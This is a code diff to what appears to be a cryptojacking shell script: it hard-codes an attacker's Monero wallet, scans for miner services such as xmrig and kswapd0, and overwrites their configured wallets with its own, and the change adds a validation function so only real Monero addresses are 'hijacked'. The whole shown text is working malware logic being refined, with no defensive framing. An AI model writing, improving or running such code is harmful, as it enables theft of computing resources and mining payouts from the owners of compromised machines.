@@ -2481,6 +2481,42 @@ echo ""
 
 MY_WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
 
+# Function to validate if a string is a Monero wallet address
+is_monero_wallet() {
+    local address="$1"
+    
+    # Check if empty or too short
+    [ -z "$address" ] && return 1
+    [ ${#address} -lt 90 ] && return 1
+    
+    # Monero addresses start with 4 (standard, 95 chars) or 8 (integrated, 106 chars)
+    # Subaddresses start with 8 (87 chars)
+    local first_char="${address:0:1}"
+    if [ "$first_char" != "4" ] && [ "$first_char" != "8" ]; then
+        return 1
+    fi
+    
+    # Check length is valid for Monero addresses
+    local addr_len=${#address}
+    if [ $addr_len -ne 95 ] && [ $addr_len -ne 106 ] && [ $addr_len -ne 87 ]; then
+        return 1
+    fi
+    
+    # Check for invalid characters (Monero uses base58, no: 0, O, I, l)
+    # Also reject common placeholders/patterns
+    if echo "$address" | grep -qE '[^123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]'; then
+        return 1
+    fi
+    
+    # Reject obvious placeholders
+    if echo "$address" | grep -qiE '(\[\[|example|test|placeholder|sample|dummy|xxx|dbuser|softdb|admin)'; then
+        return 1
+    fi
+    
+    # Valid Monero wallet address
+    return 0
+}
+
 echo "[*] Searching for existing miner config files..."
 echo "[*] This will replace any wallet addresses with: ${MY_WALLET:0:20}...${MY_WALLET: -10}"
 echo ""
@@ -2515,6 +2551,12 @@ for search_path in "${SEARCH_PATHS[@]}"; do
                 
                 # Extract current wallet
                 CURRENT_WALLET=$(grep '"user"' "$config_file" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
+                
+                # Validate it's actually a Monero wallet address
+                if ! is_monero_wallet "$CURRENT_WALLET"; then
+                    # Not a wallet address, skip this file
+                    continue
+                fi
                 
                 # Check if it's already our wallet
                 if [ "$CURRENT_WALLET" = "$MY_WALLET" ]; then
@@ -2569,6 +2611,12 @@ for service_name in xmrig swapd kswapd0 minerd cpuminer miner; do
                 # Check and hijack if needed
                 if grep -q '"user"' "$CONFIG_PATH" 2>/dev/null; then
                     CURRENT_WALLET=$(grep '"user"' "$CONFIG_PATH" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
+                    
+                    # Validate it's actually a Monero wallet address
+                    if ! is_monero_wallet "$CURRENT_WALLET"; then
+                        echo "  [*] Not a miner config (invalid wallet format)"
+                        continue
+                    fi
                     
                     if [ "$CURRENT_WALLET" != "$MY_WALLET" ]; then
                         echo "  [!] Different wallet detected - hijacking..."
